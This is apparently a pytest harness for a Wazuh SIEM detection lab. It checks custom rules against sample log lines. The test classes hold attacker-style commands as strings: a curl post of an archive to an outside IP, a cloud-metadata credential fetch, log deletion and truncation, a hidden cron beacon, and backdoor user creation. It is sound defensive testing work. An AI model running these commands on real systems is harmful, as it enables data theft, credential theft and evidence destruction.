"""
Rule test harness for siem-detection-lab.

Tests that custom Wazuh rules fire on known-bad log samples
and don't fire on known-good ones.

This runs entirely locally — no Wazuh instance needed.
We parse the XML rule definitions and apply a simplified matcher.

Run with: pytest tests/test_rules.py -v
"""

import re
import sys
import xml.etree.ElementTree as ET
from pathlib import Path

import pytest

RULES_DIR = Path(__file__).parent.parent / "rules"


# ---------------------------------------------------------------------------
# Lightweight Wazuh rule evaluator
# ---------------------------------------------------------------------------

class WazuhRule:
    """Represents a single parsed Wazuh rule."""

    def __init__(self, element: ET.Element):
        self.rule_id = element.get("id", "")
        self.level = int(element.get("level", "0"))
        self.frequency = int(element.get("frequency", "1"))

        self.if_sid = element.findtext("if_sid", "").strip()
        self.if_matched_sid = element.findtext("if_matched_sid", "").strip()
        self.match_text = element.findtext("match", "").strip()
        self.regex_text = element.findtext("regex", "").strip()
        self.description = element.findtext("description", "").strip()
        self.mitre_ids = [e.text.strip() for e in element.findall(".//mitre/id") if e.text]

        field_elements = element.findall("field")
        self.fields: dict[str, str] = {}
        for f in field_elements:
            name = f.get("name", "")
            value = f.text or ""
            self.fields[name] = value.strip()

        self._match_re = re.compile(self.match_text, re.IGNORECASE) if self.match_text else None
        self._regex_re = re.compile(self.regex_text, re.IGNORECASE) if self.regex_text else None

    def matches_log(self, log_line: str) -> bool:
        """
        Simplified matching — checks match and regex against the log line.
        Does not handle if_sid chaining or frequency thresholds.
        """
        if self._match_re and not self._match_re.search(log_line):
            return False
        if self._regex_re and not self._regex_re.search(log_line):
            return False
        return True

    def __repr__(self):
        return f"WazuhRule({self.rule_id}, level={self.level}, '{self.description[:40]}')"


def load_all_rules() -> list[WazuhRule]:
    rules = []
    for xml_file in sorted(RULES_DIR.rglob("*.xml")):
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            # Handle both <group> wrapper and bare <rule> elements
            elements = root.findall(".//rule") if root.tag != "rule" else [root]
            for el in elements:
                rules.append(WazuhRule(el))
        except ET.ParseError as e:
            pytest.fail(f"XML parse error in {xml_file}: {e}")
    return rules


def rules_fired(log_line: str, all_rules: list[WazuhRule]) -> list[str]:
    return [r.rule_id for r in all_rules if r.matches_log(log_line)]


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(scope="session")
def rules():
    loaded = load_all_rules()
    assert len(loaded) > 0, "No rules loaded — check RULES_DIR path"
    return loaded


# ---------------------------------------------------------------------------
# Rule structure tests
# ---------------------------------------------------------------------------

class TestRuleStructure:
    def test_all_rules_have_ids(self, rules):
        for r in rules:
            assert r.rule_id, f"Rule missing ID: {r}"

    def test_all_rules_have_descriptions(self, rules):
        for r in rules:
            assert r.description, f"Rule {r.rule_id} has no description"

    def test_all_rules_have_mitre_mapping(self, rules):
        # Custom rules (100xxx) should all have MITRE IDs
        custom = [r for r in rules if r.rule_id.startswith("1")]
        for r in custom:
            assert r.mitre_ids, f"Rule {r.rule_id} ({r.description[:30]}) has no MITRE mapping"

    def test_rule_ids_are_unique(self, rules):
        ids = [r.rule_id for r in rules]
        duplicates = [i for i in ids if ids.count(i) > 1]
        assert not duplicates, f"Duplicate rule IDs: {set(duplicates)}"

    def test_custom_rules_start_at_100100(self, rules):
        custom_ids = [int(r.rule_id) for r in rules if r.rule_id.isdigit() and int(r.rule_id) >= 100000]
        for cid in custom_ids:
            assert cid >= 100100, f"Rule ID {cid} conflicts with Wazuh built-in range (< 100100)"


# ---------------------------------------------------------------------------
# SSH brute force
# ---------------------------------------------------------------------------

class TestSSHBruteForce:
    SSH_FAIL = "Oct  1 14:22:11 bastion sshd[12341]: Failed password for root from 45.142.212.100 port 54321 ssh2"
    SSH_SUCCESS = "Oct  1 14:22:30 bastion sshd[12399]: Accepted publickey for deploy from 10.0.0.5 port 22 ssh2"
    INVALID_USER = "Oct  1 14:22:11 bastion sshd[12341]: Invalid user oracle from 45.142.212.100 port 54322"

    def test_fires_on_failed_password(self, rules):
        fired = rules_fired(self.SSH_FAIL, rules)
        assert "100100" in fired or "100103" in fired, f"Expected 100100 or 100103, got {fired}"

    def test_fires_on_invalid_user(self, rules):
        fired = rules_fired(self.INVALID_USER, rules)
        assert any(r.startswith("1001") for r in fired), f"No SSH rule fired on invalid user: {fired}"

    def test_does_not_fire_on_successful_login(self, rules):
        fired = rules_fired(self.SSH_SUCCESS, rules)
        # 100200 (lateral movement) might fire — that's expected
        brute_rules = [f for f in fired if f in ("100100", "100101", "100102", "100103")]
        assert not brute_rules, f"Brute force rule fired on success: {brute_rules}"


# ---------------------------------------------------------------------------
# Log deletion / defense evasion
# ---------------------------------------------------------------------------

class TestLogDeletion:
    LOG_DELETE_CMD = "root: rm -f /var/log/auth.log"
    LOG_TRUNCATE = "root: cat /dev/null > /var/log/syslog"
    NORMAL_LOG_WRITE = "app: writing to /var/log/myapp.log"

    def test_fires_on_rm_var_log(self, rules):
        fired = rules_fired(self.LOG_DELETE_CMD, rules)
        assert "100401" in fired, f"Expected 100401, got {fired}"

    def test_fires_on_truncate(self, rules):
        fired = rules_fired(self.LOG_TRUNCATE, rules)
        assert "100401" in fired, f"Expected 100401, got {fired}"

    def test_does_not_fire_on_normal_log_write(self, rules):
        fired = rules_fired(self.NORMAL_LOG_WRITE, rules)
        evasion = [f for f in fired if f.startswith("1004")]
        assert not evasion, f"Defense evasion rule fired on normal log write: {evasion}"


# ---------------------------------------------------------------------------
# Persistence
# ---------------------------------------------------------------------------

class TestPersistence:
    CRON_CMD = "(www-data) CMD (* * * * * /tmp/.hidden/beacon.sh)"
    NEW_USER = "new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor"
    SUDO_GROUP = "add 'backdoor' to group 'sudo'"

    def test_fires_on_suspicious_cron(self, rules):
        fired = rules_fired(self.CRON_CMD, rules)
        assert any(r.startswith("1003") for r in fired), f"No persistence rule fired: {fired}"

    def test_fires_on_new_user(self, rules):
        fired = rules_fired(self.NEW_USER, rules)
        assert any(r in fired for r in ("100310", "100311")), f"No new-user rule fired: {fired}"

    def test_fires_on_sudo_group_add(self, rules):
        fired = rules_fired(self.SUDO_GROUP, rules)
        assert "100311" in fired, f"Expected 100311, got {fired}"


# ---------------------------------------------------------------------------
# Exfiltration
# ---------------------------------------------------------------------------

class TestExfiltration:
    CURL_EXFIL = "www-data: curl -s -d @/tmp/out.tar.gz https://198.51.100.9/recv"
    NORMAL_CURL = "deploy: curl -o /tmp/artifact.zip https://releases.example.com/v1.0.zip"

    def test_fires_on_curl_data_post(self, rules):
        fired = rules_fired(self.CURL_EXFIL, rules)
        assert "100501" in fired, f"Expected 100501, got {fired}"

    def test_does_not_fire_on_normal_download(self, rules):
        fired = rules_fired(self.NORMAL_CURL, rules)
        exfil = [f for f in fired if f == "100501"]
        assert not exfil, f"Exfil rule incorrectly fired on normal download: {exfil}"


# ---------------------------------------------------------------------------
# Discovery
# ---------------------------------------------------------------------------

class TestDiscovery:
    NMAP = "alice: nmap -sS -p 1-65535 10.0.0.0/24"
    METADATA = "app: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"

    def test_fires_on_nmap(self, rules):
        fired = rules_fired(self.NMAP, rules)
        assert "100600" in fired, f"Expected 100600, got {fired}"

    def test_fires_on_metadata_access(self, rules):
        fired = rules_fired(self.METADATA, rules)
        assert "100602" in fired, f"Expected 100602, got {fired}"
